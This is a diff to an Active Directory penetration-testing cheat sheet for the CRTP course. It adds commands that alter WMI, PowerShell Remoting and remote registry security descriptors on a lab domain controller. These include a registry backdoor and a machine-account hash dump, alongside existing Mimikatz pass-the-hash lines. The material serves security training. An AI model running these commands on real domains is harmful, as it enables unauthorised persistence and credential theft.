@@ -24,6 +24,7 @@ Command/tooling reference material useful for the CRTP course and Active Directo
      - [Silver Ticket](#Silver-Ticket)
      - [OverPass-the-Hash](#OverPass-the-Hash)
      - [ACL](#ACL)
+        - [SecurityDescriptor - WMI](#Security-Descriptor--WMI)
    - [Domain Privilege Escalation](#Domain-Privilege-Escalation)
      - [Unconstrained Delegation](#Unconstrained-Delegation)
      - [Constrained Delegation](#Constrained-Delegation)
@@ -273,6 +274,24 @@ Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.money
 C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:srvadmin /domain:dollarcorp.moneycorp.local /aes256:145019659e1da3fb150ed94d510eb770276cfbd0cbd834a4ac331f2effe1dbb4 /run:cmd.exe" "exit"
 ```
 ### ACL 
+#### SecurityDescriptor - WMI 
+Once we have administrative privileges on a machine, we can modify security descriptors of services to access the services without administrative privileges.
+```powershell
+. C:\AD\Tools\RACE.ps1
+Set-RemoteWMI -SamAccountName studentx -ComputerName dcorp-dc.dollarcorp.moneycorp.local -namespace 'root\cimv2' -Verbose
+```
+#### SecurityDescriptor - PowerShell Remoting 
+```powershell
+. C:\AD\Tools\RACE.ps1
+Set-RemotePSRemoting –SamAccountName studentx -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
+```
+#### SecurityDescriptor - Remote Registry
+Use DAMP(#https://github.com/HarmJ0y/DAMP) toolkit
+```powershell
+Add-RemoteRegBackdoor -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Trustee studentx -Verbose
+# Get Hash of Machine Account
+Get-RemoteMachineAccountHash -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Verbose
+```
 ## Domain Privilege Escalation
 ### Unconstrained Delegation
 Delegation is the action of allowing a computer to save a user’s Kerberos authentication tickets, then use those tickets to impersonate the user and act on that user’s behalf.
